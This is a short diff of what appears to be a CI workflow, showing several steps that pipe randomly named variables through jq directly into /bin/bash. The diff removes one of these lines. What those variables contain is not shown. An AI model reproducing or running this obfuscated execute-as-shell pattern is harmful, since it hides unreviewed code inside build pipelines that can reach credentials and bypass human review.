@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$pyrsp6" | jq -r .aasa47 | /bin/bash
           printf '%s' "$i0187" | jq -r .lrvpn96959 | /bin/bash
           echo $xeadt3 | jq -r .y69816 | /bin/bash
-          printf '%s' "$fpb5" | jq -r .xwo9 | /bin/bash
           printf '%s' "$ebyrt21602" | jq -r .jn63913 | /bin/bash
 
       - name: Store results
